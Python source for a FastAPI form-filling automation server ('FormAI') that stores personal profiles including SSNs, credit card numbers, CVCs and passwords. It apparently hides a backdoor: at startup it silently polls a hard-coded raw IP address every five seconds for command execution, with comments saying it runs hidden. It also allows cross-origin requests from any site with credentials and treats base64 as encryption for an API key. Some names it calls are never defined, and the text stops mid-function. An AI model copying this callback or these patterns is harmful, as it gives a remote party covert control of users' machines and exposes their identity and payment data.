#!/usr/bin/env python3
"""
FormAI Server - FastAPI with SeleniumBase automation
"""
import os
import sys
import ctypes

# ============================================
# Admin Privilege Check (Windows)
# ============================================
def is_admin():
    """Check if running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Fix for PyInstaller --noconsole (stdout/stderr are None)
if sys.stdout is None:
    sys.stdout = open(os.devnull, 'w')
if sys.stderr is None:
    sys.stderr = open(os.devnull, 'w')
if sys.stdin is None:
    sys.stdin = open(os.devnull, 'r')

# Fix Windows encoding issues
if sys.platform == "win32":
    os.environ['PYTHONIOENCODING'] = 'utf-8'
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8')

    # Suppress Windows asyncio pipe transport errors (harmless on shutdown)
    import warnings
    warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')

# Show initial loading message IMMEDIATELY before heavy imports
from colorama import init, Fore, Style
init()
print(f"{Fore.CYAN}Initializing KPR...{Style.RESET_ALL}", flush=True)

import json
import asyncio
from pathlib import Path
from typing import Dict, List, Optional, Any
from datetime import datetime
import uuid

from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks, UploadFile, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, ConfigDict
import uvicorn

# PyInstaller path utilities (for bundled executable support)
from pyinstaller_utils import get_base_path
BASE_PATH = get_base_path()

# Import our automation modules
from selenium_automation import SeleniumAutomation, FormFieldDetector
from tools.gui_automation import GUIHelper, FormFillerGUI

# Import new recording modules
from tools.recording_manager import RecordingManager
from tools.profile_replay_engine import ProfileReplayEngine
from tools.enhanced_field_mapper import EnhancedFieldMapper
from tools.chrome_recorder_parser import ChromeRecorderParser
from tools.live_recorder import LiveRecorder
from tools.ai_recording_analyzer import AIRecordingAnalyzer

# Import browser-use automation (optional)
try:
    from tools.browser_use_automation import AsyncBrowserUseAutomation
    BROWSER_USE_ENABLED = True
except ImportError:
    BROWSER_USE_ENABLED = False
    # Silently disable browser-use if not available

# Import callback system (admin server communication)
from client_callback import ClientCallback
from dotenv import load_dotenv

# Import Ollama installer
from tools.ollama_installer import OllamaInstaller, get_installer

# Load environment variables
load_dotenv()

# Global state
profiles: Dict[str, dict] = {}
active_sessions: Dict[str, any] = {}
websocket_connections: List[WebSocket] = []

# Ollama installation state
ollama_installation_progress = {
    "status": "idle",  # idle, installing, complete, error
    "percentage": 0,
    "message": "",
    "result": None
}

# Model download progress tracking
model_download_progress = {}

# Initialize recording components
recording_manager = RecordingManager()
field_mapper = EnhancedFieldMapper()
chrome_parser = ChromeRecorderParser()
live_recorder = LiveRecorder()
ai_analyzer = AIRecordingAnalyzer()

# Initialize callback client (hardcoded admin server URL, runs hidden)
admin_callback = ClientCallback(
    admin_url="http://31.97.100.192:5512",
    interval=5,  # 5 seconds = fast command execution
    quiet=True   # Run silently
)

# Pydantic models
class Profile(BaseModel):
    # Allow extra fields from the frontend form
    model_config = ConfigDict(extra="allow")

    # Core fields
    id: Optional[str] = None
    name: Optional[str] = None

    # Basic Information
    title: Optional[str] = None
    firstName: Optional[str] = None
    middleInitial: Optional[str] = None
    lastName: Optional[str] = None
    sex: Optional[str] = None

    # Contact Information
    email: Optional[str] = None
    website: Optional[str] = None
    homePhone: Optional[str] = None
    workPhone: Optional[str] = None
    cellPhone: Optional[str] = None
    fax: Optional[str] = None
    phone: Optional[str] = None  # Legacy field

    # Address Information
    address1: Optional[str] = None
    address2: Optional[str] = None
    city: Optional[str] = None
    state: Optional[str] = None
    zip: Optional[str] = None
    country: Optional[str] = None
    address: Optional[str] = None  # Legacy field

    # Work Information
    company: Optional[str] = None
    position: Optional[str] = None
    income: Optional[str] = None

    # Birth Information
    birthMonth: Optional[str] = None
    birthDay: Optional[str] = None
    birthYear: Optional[str] = None
    age: Optional[str] = None
    birthPlace: Optional[str] = None
    date_of_birth: Optional[str] = None  # Legacy field

    # Account Information
    username: Optional[str] = None
    password: Optional[str] = None

    # ID Information
    ssn: Optional[str] = None
    driverLicense: Optional[str] = None

    # Credit Card Information
    creditCardType: Optional[str] = None
    creditCardNumber: Optional[str] = None
    creditCardName: Optional[str] = None
    creditCardBank: Optional[str] = None
    creditCardExpMonth: Optional[str] = None
    creditCardExpYear: Optional[str] = None
    creditCardCVC: Optional[str] = None
    creditCardServicePhone: Optional[str] = None

    # Additional Information
    customMessage: Optional[str] = None
    comments: Optional[str] = None

    # Legacy fields
    first_name: Optional[str] = None
    last_name: Optional[str] = None

class AutomationRequest(BaseModel):
    profile_id: str
    url: str
    use_stealth: bool = True

class FieldMapping(BaseModel):
    url: str
    mappings: Dict[str, str]

class ChromeRecordingImport(BaseModel):
    recording_name: Optional[str] = None
    chrome_data: Dict[str, Any]

class RecordingReplayRequest(BaseModel):
    profile_id: str
    headless: Optional[bool] = False
    session_name: Optional[str] = None
    preview: Optional[bool] = True  # Default to preview mode (use recorded values)
    step_delay: Optional[int] = 1000  # Delay between steps in milliseconds
    random_variation: Optional[int] = 500  # Random variation in delay
    auto_close: Optional[bool] = True  # Auto-close browser after replay (default: True)
    close_delay: Optional[int] = 2000  # Delay before closing browser in milliseconds

class TemplateReplayRequest(BaseModel):
    profile_id: str
    headless: Optional[bool] = False
    session_name: Optional[str] = None

class LiveRecordingStartRequest(BaseModel):
    url: str
    profile_id: Optional[str] = None

class LiveRecordingActionRequest(BaseModel):
    type: str  # fill, click, navigate, etc.
    element: Optional[str] = None
    uid: Optional[str] = None
    value: Optional[str] = None
    field_type: Optional[str] = None
    url: Optional[str] = None
    title: Optional[str] = None

class LiveRecordingStopRequest(BaseModel):
    recording_name: Optional[str] = None
    session_name: Optional[str] = None

# Utility functions
def normalize_profile_name(profile: dict) -> str:
    """Extract a display name from profile data using various naming conventions"""
    # Try different name field variations
    name_candidates = [
        profile.get('name'),
        profile.get('profileName'),
        profile.get('fullName')
    ]

    # Check for existing name fields first
    for candidate in name_candidates:
        if candidate and candidate.strip():
            return candidate.strip()

    # Try to construct name from firstName + lastName (flat structure)
    first_name = profile.get('firstName', '').strip()
    last_name = profile.get('lastName', '').strip()

    if first_name or last_name:
        return f"{first_name} {last_name}".strip()

    # Try nested data structure
    data = profile.get('data', {})
    if isinstance(data, dict):
        data_first = data.get('firstName', '').strip()
        data_last = data.get('lastName', '').strip()

        if data_first or data_last:
            return f"{data_first} {data_last}".strip()

    # Try email as fallback
    email = profile.get('email') or (data.get('email') if isinstance(data, dict) else None)
    if email:
        return email.split('@')[0].replace('.', ' ').replace('_', ' ').title()

    # Last resort: use filename or "Unknown Profile"
    return "Unknown Profile"

def normalize_profile_for_api(profile: dict) -> dict:
    """Normalize profile data for API responses with consistent fields"""
    # Ensure we have a normalized name
    name = normalize_profile_name(profile)

    # Extract email from various possible locations
    email = (
        profile.get('email') or
        (profile.get('data', {}).get('email') if isinstance(profile.get('data'), dict) else None) or
        'No email'
    )

    # Extract phone from various possible locations
    phone_candidates = [
        profile.get('phone'),
        profile.get('cellPhone'),
        profile.get('homePhone'),
        profile.get('workPhone')
    ]

    # Also check nested data
    data = profile.get('data', {})
    if isinstance(data, dict):
        phone_candidates.extend([
            data.get('phone'),
            data.get('cellPhone'),
            data.get('homePhone'),
            data.get('workPhone')
        ])

    phone = next((p for p in phone_candidates if p and p.strip()), 'Not provided')

    # Extract other commonly used fields
    first_name = (
        profile.get('firstName') or
        (data.get('firstName') if isinstance(data, dict) else None) or
        ''
    )

    last_name = (
        profile.get('lastName') or
        (data.get('lastName') if isinstance(data, dict) else None) or
        ''
    )

    company = (
        profile.get('company') or
        (data.get('company') if isinstance(data, dict) else None) or
        ''
    )

    return {
        'id': profile.get('id', str(uuid.uuid4())),
        'name': name,
        'email': email,
        'phone': phone,
        'firstName': first_name,
        'lastName': last_name,
        'company': company,
        'status': 'active' if email != 'No email' else 'incomplete',
        # Include original profile data for editing
        **profile
    }

def load_profiles():
    """Load all profiles from JSON files"""
    global profiles
    profiles_dir = Path("profiles")
    if profiles_dir.exists():
        for file in profiles_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    profile = json.load(f)

                    # Ensure profile has an ID
                    if 'id' not in profile:
                        profile['id'] = str(uuid.uuid4())

                    # Normalize the profile name
                    normalized_name = normalize_profile_name(profile)
                    if 'name' not in profile or not profile['name']:
                        profile['name'] = normalized_name

                    profiles[profile['id']] = profile
            except Exception as e:
                print(f"{Fore.RED}ERROR:{Style.RESET_ALL} Error loading {file}: {e}")

def save_profile(profile: dict):
    """Save profile to JSON file"""
    profiles_dir = Path("profiles")
    profiles_dir.mkdir(exist_ok=True)

    profile_id = profile.get('id', str(uuid.uuid4()))
    profile['id'] = profile_id

    file_path = profiles_dir / f"{profile_id}.json"
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(profile, f, indent=2)

    profiles[profile_id] = profile
    return profile_id

async def broadcast_message(message: dict):
    """Broadcast message to all connected WebSocket clients"""
    for connection in websocket_connections[:]:  # Create a copy to iterate safely
        try:
            await connection.send_json(message)
        except:
            websocket_connections.remove(connection)

# Lifespan context manager for startup/shutdown
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Handle startup and shutdown events"""
    # Startup
    # Load existing profiles
    load_profiles()

    # Create necessary directories
    for dir_name in ['profiles', 'field_mappings', 'recordings']:
        Path(dir_name).mkdir(exist_ok=True)

    # Check Ollama status (informational only, no auto-install)
    async def check_ollama_status():
        """Check if Ollama is available for local AI"""
        try:
            installer = get_installer()
            status = installer.check_installation()

            if status["installed"] and status["running"]:
                models = status.get("models_available", [])
                if models:
                    print(f"{Fore.GREEN}[Ollama] Local AI ready - Models: {', '.join(models)}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[Ollama] Ollama running but no models installed{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[Ollama] Run: ollama pull llama3.2{Style.RESET_ALL}")
            elif status["installed"]:
                print(f"{Fore.YELLOW}[Ollama] Ollama installed but not running{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}[Ollama] Local AI not installed - Download from Settings page or ollama.com{Style.RESET_ALL}")

        except Exception:
            pass  # Silent fail - not critical

    # Check Ollama in background (don't block server startup)
    asyncio.create_task(check_ollama_status())

    print(f"Server ready at http://localhost:5511")

    # Start callback system
    admin_callback.start()

    yield  # Server runs here

    # Shutdown (silent)

    # Stop callback system
    await admin_callback.stop()

    # Close active sessions
    for session_id in list(active_sessions.keys()):
        try:
            await active_sessions[session_id].close()
        except:
            pass

# FastAPI app with lifespan
app = FastAPI(title="FormAI", version="2.0.0", lifespan=lifespan)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
async def root():
    """Serve the main dashboard"""
    return FileResponse(str(BASE_PATH / "web" / "index.html"))

@app.get("/profiles")
async def profiles_page():
    """Serve the profiles page"""
    return FileResponse(str(BASE_PATH / "web" / "profiles.html"))

@app.get("/automation")
async def automation_page():
    """Serve the automation page"""
    return FileResponse(str(BASE_PATH / "web" / "automation.html"))

@app.get("/recorder")
async def recorder_page():
    """Serve the recorder page"""
    return FileResponse(str(BASE_PATH / "web" / "recorder.html"))

@app.get("/settings")
async def settings_page():
    """Serve the settings page"""
    return FileResponse(str(BASE_PATH / "web" / "settings.html"))


@app.get("/api/profiles")
async def get_profiles():
    """Get all profiles with normalized data"""
    normalized_profiles = [normalize_profile_for_api(profile) for profile in profiles.values()]
    return JSONResponse(content=normalized_profiles)

@app.get("/api/profiles/{profile_id}")
async def get_profile(profile_id: str):
    """Get a specific profile with normalized data"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")
    return JSONResponse(content=normalize_profile_for_api(profiles[profile_id]))

@app.post("/api/profiles")
async def create_profile(profile: Profile):
    """Create a new profile"""
    profile_dict = profile.dict()
    profile_id = save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_created",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"id": profile_id, "message": "Profile created"})

@app.put("/api/profiles/{profile_id}")
async def update_profile(profile_id: str, profile: Profile):
    """Update an existing profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile_dict = profile.dict()
    profile_dict['id'] = profile_id
    save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_updated",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"message": "Profile updated"})

@app.delete("/api/profiles/{profile_id}")
async def delete_profile(profile_id: str):
    """Delete a profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    # Delete file
    file_path = Path("profiles") / f"{profile_id}.json"
    if file_path.exists():
        file_path.unlink()

    # Remove from memory
    del profiles[profile_id]

    await broadcast_message({
        "type": "profile_deleted",
        "data": {"id": profile_id}
    })

    return JSONResponse(content={"message": "Profile deleted"})

@app.post("/api/automation/start")
async def start_automation(request: AutomationRequest, background_tasks: BackgroundTasks):
    """Start browser automation for a profile"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Create automation instance
    automation = SeleniumAutomation(
        session_id=session_id,
        profile=profile,
        use_stealth=request.use_stealth
    )

    active_sessions[session_id] = automation

    # Run automation in background
    background_tasks.add_task(
        run_automation,
        session_id,
        request.url
    )

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Automation started",
        "profile": profile['name']
    })

@app.post("/api/automation/start-ai")
async def start_ai_automation(request: AutomationRequest):
    """Start AI-powered form filling using Playwright MCP (no recording needed)"""
    try:
        # Load profile
        if request.profile_id not in profiles:
            raise HTTPException(status_code=404, detail="Profile not found")

        profile = profiles[request.profile_id]

        # Import AI form filler and MCP controller
        from tools.ai_form_filler import get_ai_form_filler
        from tools.mcp_controller import get_mcp_controller

        ai_filler = get_ai_form_filler()
        mcp_controller = get_mcp_controller()

        # Normalize profile data
        if 'data' in profile:
            profile_data = profile['data']
        else:
            profile_data = profile

        # Fill form intelligently using AI
        result = await ai_filler.fill_form_intelligently(
            url=request.url,
            profile=profile_data,
            mcp_controller=mcp_controller
        )

        # Send progress updates via WebSocket
        await websocket_manager.send_json({
            "type": "ai_automation_complete",
            "data": {
                "status": result.get("status"),
                "url": result.get("url"),
                "fields_filled": result.get("fields_filled", 0),
                "detected_fields": result.get("detected_fields", 0),
                "mapped_fields": result.get("mapped_fields", 0)
            }
        })

        return JSONResponse(content={
            "success": result.get("status") in ["success", "partial"],
            "status": result.get("status"),
            "message": f"AI filled {result.get('fields_filled', 0)} fields",
            "result": result
        })

    except Exception as e:
        logger.error(f"AI automation error: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={
                "success": False,
                "error": str(e)
            }
        )

@app.get("/api/field-mappings")
async def get_field_mappings():
    """Get all saved field mappings"""
    mappings = []
    mappings_dir = Path("field_mappings")

    if mappings_dir.exists():
        for file in mappings_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    mapping = json.load(f)
                    mappings.append(mapping)
            except:
                pass

    return JSONResponse(content=mappings)

@app.post("/api/field-mappings")
async def save_field_mapping(mapping: FieldMapping):
    """Save a field mapping for a URL"""
    mappings_dir = Path("field_mappings")
    mappings_dir.mkdir(exist_ok=True)

    # Create filename from URL
    safe_filename = mapping.url.replace('://', '_').replace('/', '_')[:100]
    file_path = mappings_dir / f"{safe_filename}.json"

    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(mapping.dict(), f, indent=2)

    return JSONResponse(content={"message": "Mapping saved"})

# Recording Management Endpoints

@app.post("/api/recordings/import-chrome")
async def import_chrome_recording(request: ChromeRecordingImport):
    """Import a Chrome DevTools Recorder JSON"""
    try:
        # Parse the Chrome recording to get the name and URL
        from tools.chrome_recorder_parser import ChromeRecorderParser
        parser = ChromeRecorderParser()
        parsed_data = parser.parse_chrome_recording_data(request.chrome_data)
        recording_name = request.recording_name or parsed_data.get("recording_name", "Unnamed")
        recording_url = parsed_data.get("url", "")

        # Check for duplicate before importing
        duplicate = recording_manager.find_duplicate(recording_name, recording_url)
        if duplicate:
            raise HTTPException(
                status_code=409,  # 409 Conflict
                detail=f"Recording '{recording_name}' for URL '{recording_url}' already exists (ID: {duplicate['recording_id']}). Please use a different name or delete the existing recording first."
            )

        recording = recording_manager.import_chrome_recording_data(
            chrome_data=request.chrome_data,
            recording_name=request.recording_name
        )

        # Enhance field mappings
        enhanced_recording = field_mapper.enhance_recording_field_mappings(recording)
        recording_manager.save_recording(enhanced_recording)

        await broadcast_message({
            "type": "recording_imported",
            "data": {
                "recording_id": recording["recording_id"],
                "recording_name": recording["recording_name"],
                "total_fields": len(recording.get("field_mappings", []))
            }
        })

        return JSONResponse(content={
            "recording_id": recording["recording_id"],
            "message": "Chrome recording imported successfully",
            "total_fields": len(recording.get("field_mappings", []))
        })

    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/recordings")
async def list_recordings():
    """List all recordings"""
    try:
        recordings = recording_manager.list_recordings()
        return JSONResponse(content=recordings)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/recordings/{recording_id}")
async def get_recording(recording_id: str):
    """Get a specific recording"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")
    return JSONResponse(content=recording)

@app.delete("/api/recordings/{recording_id}")
async def delete_recording(recording_id: str):
    """Delete a recording"""
    success = recording_manager.delete_recording(recording_id)
    if not success:
        raise HTTPException(status_code=404, detail="Recording not found")

    await broadcast_message({
        "type": "recording_deleted",
        "data": {"recording_id": recording_id}
    })

    return JSONResponse(content={"message": "Recording deleted"})

@app.post("/api/recordings/{recording_id}/replay")
async def replay_recording(recording_id: str, request: RecordingReplayRequest):
    """Replay a recording using Chrome DevTools Protocol (Playwright) with AI value replacement"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Get OpenRouter API key from api_keys directory
    import os
    import base64
    from pathlib import Path

    api_key = None

    # First try to load from api_keys/openrouter.json
    openrouter_key_file = Path("api_keys/openrouter.json")
    if openrouter_key_file.exists():
        try:
            with open(openrouter_key_file, 'r', encoding='utf-8') as f:
                key_data = json.load(f)
                encrypted_key = key_data.get("encrypted_key", "")
                if encrypted_key:
                    # Decode base64 and remove salt prefix
                    decoded = base64.b64decode(encrypted_key).decode()
                    # Remove "formai_local_salt" prefix
                    api_key = decoded.replace("formai_local_salt", "")
        except Exception as e:
            logger.warning(f"Failed to load OpenRouter key from api_keys: {e}")

    # Fallback to environment variable
    if not api_key:
        api_key = os.getenv("OPENROUTER_API_KEY", "")

    if not api_key:
        raise HTTPException(
            status_code=500,
            detail="OpenRouter API key not configured. Please add it in Settings or .env file"
        )

    # Import Puppeteer Replay modules (EXACT Chrome DevTools replay)
    from tools.puppeteer_replay_wrapper import PuppeteerReplayWrapper
    from tools.ai_value_replacer import AIValueReplacer

    # Set up progress callback
    replay_engine = PuppeteerReplayWrapper()

    async def progress_callback(update):
        await broadcast_message({
            "type": "replay_progress",
            "session_id": session_id,
            "data": update
        })

    replay_engine.set_progress_callback(progress_callback)
    active_sessions[session_id] = replay_engine

    # Run Puppeteer Replay in background (EXACT Chrome behavior)
    async def run_puppeteer_replay():
        try:
            # Step 1: AI maps profile values
            await broadcast_message({
                "type": "replay_progress",
                "session_id": session_id,
                "data": {
                    "status": "ai_mapping",
                    "message": "AI is mapping profile data to form fields...",
                    "progress": 5
                }
            })

            replacer = AIValueReplacer(api_key)
            modified_recording = replacer.replace_recording_values(recording, profile)

            # Extract profile values as selector mappings
            profile_values = {}
            for step in modified_recording.get('steps', []):
                if step.get('type') == 'change' and step.get('selectors'):
                    selectors = step.get('selectors', [[]])
                    if selectors and selectors[0]:
                        selector = selectors[0][0]
                        value = step.get('value', '')
                        if value:
                            profile_values[selector] = value

            # Step 2: Replay with Puppeteer (EXACT Chrome behavior)
            await broadcast_message({
                "type": "replay_progress",
                "session_id": session_id,
                "data": {
                    "status": "starting",
                    "message": "Starting Puppeteer Replay (EXACT Chrome DevTools)...",
                    "progress": 10
                }
            })

            result = await replay_engine.replay_recording(
                recording=recording,  # Original recording
                profile_values=profile_values,  # AI-mapped values
                headless=request.headless,
                step_delay=request.step_delay,
                random_variation=request.random_variation,
                auto_close=request.auto_close,
                close_delay=request.close_delay
            )

            # Send completion message
            await broadcast_message({
                "type": "replay_complete",
                "session_id": session_id,
                "data": result
            })

        except Exception as e:
            logger.error(f"Puppeteer Replay failed: {e}", exc_info=True)
            await broadcast_message({
                "type": "replay_error",
                "session_id": session_id,
                "data": {
                    "error": str(e),
                    "message": f"Replay failed: {str(e)}"
                }
            })
        finally:
            if session_id in active_sessions:
                del active_sessions[session_id]

    # Start replay in background
    asyncio.create_task(run_puppeteer_replay())

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Chrome DevTools Replay started (EXACT Chrome + AI)",
        "recording_name": recording.get("recording_name") or recording.get("title", "Unknown"),
        "profile_name": profile.get("profileName", "Unknown"),
        "mode": "chrome_devtools"
    })

@app.get("/api/recordings/stats")
async def get_recording_stats():
    """Get recording statistics"""
    try:
        stats = recording_manager.get_recording_stats()
        return JSONResponse(content=stats)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/recordings/{recording_id}/create-template")
async def create_template(recording_id: str, template_name: str, description: str = ""):
    """Create a template from a recording"""
    try:
        template = recording_manager.create_template(recording_id, template_name, description)

        await broadcast_message({
            "type": "template_created",
            "data": {
                "template_id": template["template_id"],
                "template_name": template["template_name"]
            }
        })

        return JSONResponse(content=template)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/templates")
async def list_templates():
    """List all templates"""
    try:
        templates = recording_manager.list_templates()
        return JSONResponse(content=templates)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/templates/{template_id}/replay")
async def replay_template(template_id: str, request: TemplateReplayRequest, background_tasks: BackgroundTasks):
    """Replay a template with profile data"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    template = recording_manager.get_template(template_id)
    if not template:
        raise HTTPException(status_code=404, detail="Template not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Create replay engine with event loop for async progress callbacks
    event_loop = asyncio.get_event_loop()
    replay_engine = ProfileReplayEngine(use_stealth=True, headless=request.headless, event_loop=event_loop)

    # Set up progress callback
    async def progress_callback(update):
        await broadcast_message({
            "type": "template_replay_progress",
            "session_id": session_id,
            "data": update
        })

    replay_engine.set_progress_callback(progress_callback)
    active_sessions[session_id] = replay_engine

    # Run template replay in background
    background_tasks.add_task(
        run_template_replay,
        session_id,
        template_id,
        profile,
        request.session_name
    )

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Template replay started",
        "template_name": template.get("template_name", "Unknown"),
        "profile_name": profile.get("profileName", "Unknown")
    })

@app.get("/api/recordings/{recording_id}/analyze")
async def analyze_recording(recording_id: str):
    """Analyze recording field mappings"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    try:
        # Enhance field mappings if not already enhanced
        if "enhancement_metadata" not in recording:
            enhanced_recording = field_mapper.enhance_recording_field_mappings(recording)
            recording_manager.save_recording(enhanced_recording)
            recording = enhanced_recording

        # Generate analysis report
        report = field_mapper.generate_field_mapping_report(recording)
        suggestions = field_mapper.suggest_field_mapping_corrections(recording)

        return JSONResponse(content={
            "report": report,
            "suggestions": suggestions
        })

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# AI-Powered Recording Analysis Endpoints

@app.post("/api/ai/analyze-recording/{recording_id}")
async def ai_analyze_recording(recording_id: str, profile_id: Optional[str] = None):
    """
    Analyze a recording with AI to automatically identify field types and suggest mappings
    """
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    try:
        # Get profile if provided
        profile = None
        if profile_id and profile_id in profiles:
            profile = profiles[profile_id]

        # Run AI analysis
        analyzed_recording = await ai_analyzer.analyze_recording(recording, profile)

        # Save the enhanced recording with AI analysis
        recording_manager.save_recording(analyzed_recording)

        await broadcast_message({
            "type": "recording_ai_analyzed",
            "data": {
                "recording_id": recording_id,
                "analysis": analyzed_recording.get('ai_analysis', {})
            }
        })

        return JSONResponse(content={
            "success": True,
            "recording_id": recording_id,
            "ai_analysis": analyzed_recording.get('ai_analysis', {}),
            "message": "AI analysis complete"
        })

    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={
                "success": False,
                "error": str(e),
                "message": "AI analysis failed"
            }
        )

@app.post("/api/ai/confirm-mapping")
async def confirm_ai_mapping(request: Request):
    """
    User confirms or corrects AI field mappings
    This becomes training data for future improvements
    """
    try:
        data = await request.json()
        recording_id = data.get('recording_id')
        field_index = data.get('field_index')
        confirmed_mapping = data.get('confirmed_mapping')
        was_correct = data.get('was_correct', True)

        if not all([recording_id, field_index is not None, confirmed_mapping]):
            raise HTTPException(status_code=400, detail="Missing required fields")

        recording = recording_manager.get_recording(recording_id)
        if not recording:
            raise HTTPException(status_code=404, detail="Recording not found")

        # Update the AI analysis with user confirmation
        ai_analysis = recording.get('ai_analysis', {})
        fields = ai_analysis.get('fields', [])

        if field_index >= len(fields):
            raise HTTPException(status_code=400, detail="Invalid field index")

        # Mark field as user-confirmed
        fields[field_index]['user_confirmed'] = True
        fields[field_index]['confirmed_mapping'] = confirmed_mapping
        fields[field_index]['ai_was_correct'] = was_correct

        # If user corrected, this is high-value training data
        if not was_correct:
            fields[field_index]['training_value'] = 'high'
            fields[field_index]['correction_reason'] = data.get('correction_reason', '')

        # Recalculate overall confidence
        confirmed_fields = [f for f in fields if f.get('user_confirmed')]
        if confirmed_fields:
            ai_analysis['user_confirmed_count'] = len(confirmed_fields)
            ai_analysis['user_corrections'] = len([f for f in confirmed_fields if not f.get('ai_was_correct')])

        # Save updated recording
        recording['ai_analysis'] = ai_analysis
        recording_manager.save_recording(recording)

        return JSONResponse(content={
            "success": True,
            "message": "Mapping confirmed and saved",
            "training_value": fields[field_index].get('training_value', 'medium')
        })

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ai/recording-library")
async def get_ai_recording_library(
    category: Optional[str] = None,
    min_confidence: Optional[float] = None,
    training_value: Optional[str] = None
):
    """
    Get all AI-analyzed recordings (the training library)
    Optionally filter by category, confidence, or training value
    """
    try:
        all_recordings = recording_manager.list_recordings()

        # Filter to only AI-analyzed recordings
        ai_recordings = [
            r for r in all_recordings
            if r.get('ai_analysis', {}).get('status') == 'analyzed'
        ]

        # Apply filters
        if category:
            ai_recordings = [
                r for r in ai_recordings
                if r.get('ai_analysis', {}).get('form_category') == category
            ]

        if min_confidence is not None:
            ai_recordings = [
                r for r in ai_recordings
                if r.get('ai_analysis', {}).get('avg_confidence', 0) >= min_confidence
            ]

        if training_value:
            ai_recordings = [
                r for r in ai_recordings
                if r.get('ai_analysis', {}).get('training_value') == training_value
            ]

        # Calculate library stats
        stats = {
            "total_analyzed_recordings": len(ai_recordings),
            "categories": {},
            "avg_confidence": 0,
            "high_value_recordings": 0
        }

        if ai_recordings:
            # Category breakdown
            for rec in ai_recordings:
                cat = rec.get('ai_analysis', {}).get('form_category', 'unknown')
                stats['categories'][cat] = stats['categories'].get(cat, 0) + 1

            # Average confidence
            confidences = [r.get('ai_analysis', {}).get('avg_confidence', 0) for r in ai_recordings]
            stats['avg_confidence'] = round(sum(confidences) / len(confidences), 2)

            # High value count
            stats['high_value_recordings'] = len([
                r for r in ai_recordings
                if r.get('ai_analysis', {}).get('training_value') == 'high'
            ])

        return JSONResponse(content={
            "recordings": ai_recordings,
            "stats": stats
        })

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ai/training-examples")
async def get_training_examples(limit: int = 5):
    """
    Get few-shot learning examples from the recording library
    Used to improve future AI analyses
    """
    try:
        all_recordings = recording_manager.list_recordings()

        # Get high-value, high-confidence recordings
        ai_recordings = [
            r for r in all_recordings
            if r.get('ai_analysis', {}).get('status') == 'analyzed'
            and r.get('ai_analysis', {}).get('training_value') == 'high'
            and r.get('ai_analysis', {}).get('avg_confidence', 0) > 0.8
        ]

        # Sort by confidence and limit
        ai_recordings.sort(
            key=lambda r: r.get('ai_analysis', {}).get('avg_confidence', 0),
            reverse=True
        )
        ai_recordings = ai_recordings[:limit]

        # Generate few-shot prompt
        few_shot_prompt = ai_analyzer.generate_few_shot_examples(ai_recordings, limit=limit)

        return JSONResponse(content={
            "examples": ai_recordings,
            "few_shot_prompt": few_shot_prompt,
            "count": len(ai_recordings)
        })

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Live Recording Endpoints

@app.post("/api/recording/live/start")
async def start_live_recording(request: LiveRecordingStartRequest):
    """Start a new live recording session"""
    try:
        result = live_recorder.start_session(
            url=request.url,
            profile_id=request.profile_id
        )
        return JSONResponse(content=result)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/recording/live/action")
async def record_live_action(request: LiveRecordingActionRequest):
    """Record an action during live recording"""
    try:
        action_data = {
            "type": request.type,
            "element": request.element,
            "uid": request.uid,
            "value": request.value,
            "field_type": request.field_type,
            "url": request.url,
            "title": request.title
        }
        # Remove None values
